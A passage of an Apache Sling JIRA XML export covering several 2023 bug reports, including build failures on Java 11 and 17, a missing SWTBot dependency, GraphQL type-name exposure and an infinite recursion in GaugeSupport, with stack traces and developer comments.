                            <comment id="17740132" author="kwin" created="Wed, 5 Jul 2023 09:58:30 +0000"  >&lt;p&gt;Fixed in &lt;a href=&quot;https://github.com/apache/sling-maven-enforcer-rules/commit/8e1ba0d0b466a368af542ac94010ee84ec70ec62&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-maven-enforcer-rules/commit/8e1ba0d0b466a368af542ac94010ee84ec70ec62&lt;/a&gt;.&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="12310050">
                    <name>Regression</name>
                                                                <inwardlinks description="is broken by">
                                        <issuelink>
            <issuekey id="13515726">MENFORCER-450</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 16 weeks ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1iykg:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11926] Eclipse modules fail to build due to missing SWTBot dependency</title>
                <link>https://issues.apache.org/jira/browse/SLING-11926</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;&lt;span class=&quot;error&quot;&gt;&amp;#91;ERROR&amp;#93;&lt;/span&gt; Failed to resolve target definition &lt;a href=&quot;file:/home/robert/sources/apache/sling/ide-tooling/eclipse/target-definition/org.apache.sling.ide.target-definition.target:&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;file:/home/robert/sources/apache/sling/ide-tooling/eclipse/target-definition/org.apache.sling.ide.target-definition.target:&lt;/a&gt; Could not find &quot;org.eclipse.swtbot.eclipse.feature.group/4.1.0.202304061555&quot; in the repositories of the current location -&amp;gt; &lt;span class=&quot;error&quot;&gt;&amp;#91;Help 1&amp;#93;&lt;/span&gt;&lt;/p&gt;</description>
                <environment></environment>
        <key id="13542427">SLING-11926</key>
            <summary>Eclipse modules fail to build due to missing SWTBot dependency</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="rombert">Robert Munteanu</assignee>
                                    <reporter username="rombert">Robert Munteanu</reporter>
                        <labels>
                    </labels>
                <created>Tue, 4 Jul 2023 13:15:54 +0000</created>
                <updated>Thu, 25 Sep 2025 10:24:35 +0000</updated>
                            <resolved>Tue, 4 Jul 2023 17:43:45 +0000</resolved>
                                                    <fixVersion>Sling Eclipse IDE 1.3.0</fixVersion>
                                    <component>IDE</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>2</watches>
                                                                                                                <comments>
                            <comment id="17739926" author="kwin" created="Tue, 4 Jul 2023 13:37:00 +0000"  >&lt;p&gt;We constantly needed to update to an available swtbot SNAPSHOT due to &lt;a href=&quot;https://bugs.eclipse.org/bugs/show_bug.cgi?id=580708&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://bugs.eclipse.org/bugs/show_bug.cgi?id=580708&lt;/a&gt;. Finally there is 4.1.0 released so we can rely on the release which should be persististing.&lt;/p&gt;</comment>
                            <comment id="17739969" author="rombert" created="Tue, 4 Jul 2023 17:43:32 +0000"  >&lt;p&gt;Ack, thanks for the context &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=kwin&quot; class=&quot;user-hover&quot; rel=&quot;kwin&quot;&gt;kwin&lt;/a&gt;&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 16 weeks, 1 day ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1iygo:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11923] Sling Events does not Build on Java 17</title>
                <link>https://issues.apache.org/jira/browse/SLING-11923</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;Attempting to build Sling Events with Java 17 fails with:&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
[main] INFO org.apache.jackrabbit.oak.plugins.index.IndexUpdate - Reindexing completed
[ERROR] Tests run: 4, Failures: 0, Errors: 4, Skipped: 0, Time elapsed: 1.935 s &amp;lt;&amp;lt;&amp;lt; FAILURE! - in org.apache.sling.event.impl.jobs.queues.TestTopicHalting
[ERROR] org.apache.sling.event.impl.jobs.queues.TestTopicHalting.testUnhalting  Time elapsed: 1.506 s  &amp;lt;&amp;lt;&amp;lt; ERROR!
java.lang.NoClassDefFoundError: java/security/acl/Group
	at java.base/java.lang.&lt;span class=&quot;code-object&quot;&gt;ClassLoader&lt;/span&gt;.defineClass1(Native Method)
	at java.base/java.lang.&lt;span class=&quot;code-object&quot;&gt;ClassLoader&lt;/span&gt;.defineClass(&lt;span class=&quot;code-object&quot;&gt;ClassLoader&lt;/span&gt;.java:1012)
	at java.base/java.security.SecureClassLoader.defineClass(SecureClassLoader.java:150)
	at java.base/jdk.internal.loader.BuiltinClassLoader.defineClass(BuiltinClassLoader.java:862)
	at java.base/jdk.internal.loader.BuiltinClassLoader.findClassOnClassPathOrNull(BuiltinClassLoader.java:760)
	at java.base/jdk.internal.loader.BuiltinClassLoader.loadClassOrNull(BuiltinClassLoader.java:681)
	at java.base/jdk.internal.loader.BuiltinClassLoader.loadClass(BuiltinClassLoader.java:639) 
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This class is deprecated for removal in Java 11: &lt;a href=&quot;https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/security/acl/Group.html&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/security/acl/Group.html&lt;/a&gt;&lt;/p&gt;</description>
                <environment></environment>
        <key id="13542141">SLING-11923</key>
            <summary>Sling Events does not Build on Java 17</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="daim">Rishabh Daim</assignee>
                                    <reporter username="dklco">Dan Klco</reporter>
                        <labels>
                    </labels>
                <created>Fri, 30 Jun 2023 18:09:12 +0000</created>
                <updated>Fri, 1 Mar 2024 15:27:50 +0000</updated>
                            <resolved>Sat, 22 Jul 2023 05:50:09 +0000</resolved>
                                    <version>Event 4.3.12</version>
                                    <fixVersion>Event 4.3.14</fixVersion>
                                    <component>Event</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>4</watches>
                                                                                                                <comments>
                            <comment id="17739201" author="kwin" created="Fri, 30 Jun 2023 18:19:19 +0000"  >&lt;p&gt;This only affects testing and is due to the old Oak version used in ITs, see also &lt;a href=&quot;https://cwiki.apache.org/confluence/pages/viewpage.action?pageId=255071690&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://cwiki.apache.org/confluence/pages/viewpage.action?pageId=255071690&lt;/a&gt;&lt;/p&gt;</comment>
                            <comment id="17739202" author="dklco" created="Fri, 30 Jun 2023 18:22:29 +0000"  >&lt;p&gt;Ah, just found the same, thanks for the link &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=kwin&quot; class=&quot;user-hover&quot; rel=&quot;kwin&quot;&gt;kwin&lt;/a&gt;! Running the build locally w/ Java 17 and will open a fix PR shortly.&lt;/p&gt;</comment>
                            <comment id="17739225" author="dklco" created="Fri, 30 Jun 2023 19:48:29 +0000"  >&lt;p&gt;The IT&apos;s are also failing due to testing.paxexam incompatibility with Java 17.&lt;/p&gt;</comment>
                            <comment id="17744276" author="egli" created="Tue, 18 Jul 2023 15:52:02 +0000"  >&lt;p&gt;FYI: merged &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-event/pull/32&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-event/pull/32&lt;/a&gt;&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="10020">
                    <name>Cloners</name>
                                                                <inwardlinks description="is cloned by">
                                        <issuelink>
            <issuekey id="13570500">SLING-12260</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                            <issuelinktype id="10030">
                    <name>Reference</name>
                                            <outwardlinks description="relates to">
                                        <issuelink>
            <issuekey id="13538288">SLING-11894</issuekey>
        </issuelink>
                            </outwardlinks>
                                                        </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 14 weeks, 1 day ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1iwp4:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11921] Building javadoc with Java 11 fails</title>
                <link>https://issues.apache.org/jira/browse/SLING-11921</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;After the fix for 11610, building javadoc with Java 11 or newer fails&lt;/p&gt;

&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;[ERROR] Failed to execute goal org.apache.maven.plugins:maven-javadoc-plugin:3.4.0:jar (default-cli) on project org.apache.sling.xss: MavenReportException: Error while generating Javadoc: 
[ERROR] Exit code: 1 - /home/robert/sources/apache/sling/org-apache-sling-xss/src/main/java/org/apache/sling/xss/impl/AntiSamyPolicyAdapter.java:39: error: package sun.misc does not exist
[ERROR] import sun.misc.Unsafe;
[ERROR]                ^
[ERROR] 
[ERROR] Command line was: /usr/lib64/jvm/java-11-openjdk-11/bin/javadoc @options @packages&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As a direct consequence, releasing must be done with Java 8&lt;/p&gt;</description>
                <environment></environment>
        <key id="13542089">SLING-11921</key>
            <summary>Building javadoc with Java 11 fails</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="rombert">Robert Munteanu</assignee>
                                    <reporter username="rombert">Robert Munteanu</reporter>
                        <labels>
                    </labels>
                <created>Fri, 30 Jun 2023 11:33:33 +0000</created>
                <updated>Mon, 13 Nov 2023 16:26:39 +0000</updated>
                            <resolved>Fri, 30 Jun 2023 13:55:42 +0000</resolved>
                                    <version>XSS Protection API 2.3.8</version>
                                    <fixVersion>XSS Protection API 2.4.0</fixVersion>
                                    <component>XSS Protection API</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                        <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 16 weeks, 5 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1iwdk:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11920] Expose Object Type Names in Selected Field</title>
                <link>https://issues.apache.org/jira/browse/SLING-11920</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;Intermediary fields are not exposed as Selected Fields in Graphql-java and so it was added as list of Object Type Name.&lt;br/&gt;
Now for handling &apos;... on &amp;lt;Type/Model&amp;gt;&apos; we need to expose these Object Type Names so that a client can deal with them.&lt;/p&gt;

&lt;p&gt;If we have a query where we have a inline fragments (&lt;a href=&quot;https://graphql.org/learn/queries/#inline-fragments&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://graphql.org/learn/queries/#inline-fragments&lt;/a&gt;) like:&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
{
   image {
     ... on ImageRef {
        type&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Then in the graphql-java 15.0 there is an inlined field called&#160;&lt;b&gt;ImageRef&lt;/b&gt; but that is now gone in 20.1. Instead we have a list of Object Type Names in a field and in our example&#160;&lt;b&gt;type&lt;/b&gt; would have Objet Type Names:&#160;&lt;b&gt;&lt;span class=&quot;error&quot;&gt;&amp;#91;&amp;quot;ImageRef&amp;quot;&amp;#93;&lt;/span&gt;&lt;/b&gt;. So for a client to obtain the type of the inlined fragments this data must be exposed.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13542004">SLING-11920</key>
            <summary>Expose Object Type Names in Selected Field</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="2" iconUrl="https://issues.apache.org/jira/images/icons/priorities/critical.svg">Critical</priority>
                        <status id="5" iconUrl="https://issues.apache.org/jira/images/icons/statuses/resolved.png" description="A resolution has been taken, and it is awaiting verification by reporter. From here issues are either reopened, or are closed.">Resolved</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="andysch">Andreas Schaefer</assignee>
                                    <reporter username="andysch">Andreas Schaefer</reporter>
                        <labels>
                    </labels>
                <created>Thu, 29 Jun 2023 21:09:29 +0000</created>
                <updated>Thu, 20 Jul 2023 07:47:54 +0000</updated>
                            <resolved>Thu, 20 Jul 2023 07:47:54 +0000</resolved>
                                    <version>GraphQL Core 0.0.20</version>
                                    <fixVersion>GraphQL Core 0.0.22</fixVersion>
                                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                <comments>
                            <comment id="17738806" author="schaefa" created="Thu, 29 Jun 2023 22:26:18 +0000"  >&lt;p&gt;This is a follow up of &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-10900&quot; title=&quot;Update graphql-java to version 17&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-10900&quot;&gt;&lt;del&gt;SLING-10900&lt;/del&gt;&lt;/a&gt; and the release of Sling GraphQL Core 0.0.20&lt;/p&gt;</comment>
                            <comment id="17741219" author="schaefa" created="Fri, 7 Jul 2023 23:35:28 +0000"  >&lt;p&gt;I created a PR &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-graphql-core/pull/36&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-graphql-core/pull/36&lt;/a&gt; that exposed the Object Type Names to the User.&lt;/p&gt;

&lt;p&gt;There is also some cleanup and additional tests to verify the proper handling of Object Type Names.&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 15 weeks, 5 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1ivuo:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11918] GaugeSupport has infinite recursion in registerWithSuffix</title>
                <link>https://issues.apache.org/jira/browse/SLING-11918</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;This exception occurs on a system with an unknown but particular configuration but none the less causes the system to become unusable.&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;

(java.lang.StackOverflowError: Delayed StackOverflowError due to&#160; ReservedStackAccess annotated method)
&#160; &#160; at java.base/java.util.concurrent.locks.AbstractQueuedSynchronizer.acquire(AbstractQueuedSynchronizer.java:1239)
&#160; &#160; at java.base/java.util.concurrent.locks.ReentrantReadWriteLock$WriteLock.lock(ReentrantReadWriteLock.java:959)
&#160; &#160; at java.management/com.sun.jmx.mbeanserver.Repository.addMBean(Repository.java:415)
&#160; &#160; at java.management/com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.registerWithRepository(DefaultMBeanServerInterceptor.java:1855)
&#160; &#160; at java.management/com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.registerDynamicMBean(DefaultMBeanServerInterceptor.java:955)
&#160; &#160; at java.management/com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.registerObject(DefaultMBeanServerInterceptor.java:890)
&#160; &#160; at java.management/com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.registerMBean(DefaultMBeanServerInterceptor.java:320)
&#160; &#160; at java.management/com.sun.jmx.mbeanserver.JmxMBeanServer.registerMBean(JmxMBeanServer.java:522)
&#160; &#160; at com.codahale.metrics.JmxReporter$JmxListener.registerMBean(JmxReporter.java:510) [io.dropwizard.metrics.core:3.2.4]
&#160; &#160; at com.codahale.metrics.JmxReporter$JmxListener.onGaugeAdded(JmxReporter.java:535) [io.dropwizard.metrics.core:3.2.4]
&#160; &#160; at com.codahale.metrics.MetricRegistry.notifyListenerOfAddedMetric(MetricRegistry.java:454) [io.dropwizard.metrics.core:3.2.4]
&#160; &#160; at com.codahale.metrics.MetricRegistry.onMetricAdded(MetricRegistry.java:448) [io.dropwizard.metrics.core:3.2.4]
&#160; &#160; at com.codahale.metrics.MetricRegistry.register(MetricRegistry.java:89) [io.dropwizard.metrics.core:3.2.4]
&#160; &#160; at org.apache.sling.event.impl.jobs.stats.GaugeSupport.registerWithSuffix(GaugeSupport.java:150) [org.apache.sling.event:4.3.8]
&#160; &#160; at org.apache.sling.event.impl.jobs.stats.GaugeSupport.registerWithSuffix(GaugeSupport.java:154) [org.apache.sling.event:4.3.8] &lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;</description>
                <environment></environment>
        <key id="13541808">SLING-11918</key>
            <summary>GaugeSupport has infinite recursion in registerWithSuffix</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="2" iconUrl="https://issues.apache.org/jira/images/icons/priorities/critical.svg">Critical</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="-1">Unassigned</assignee>
                                    <reporter username="patlego">Patrique Legault</reporter>
                        <labels>
                    </labels>
                <created>Wed, 28 Jun 2023 14:17:26 +0000</created>
                <updated>Mon, 16 Oct 2023 09:44:05 +0000</updated>
                            <resolved>Tue, 11 Jul 2023 09:46:27 +0000</resolved>
                                    <version>Event 4.3.8</version>
                                    <fixVersion>Event 4.3.14</fixVersion>
                                    <component>Event</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>3</watches>
                                                                                                                <comments>
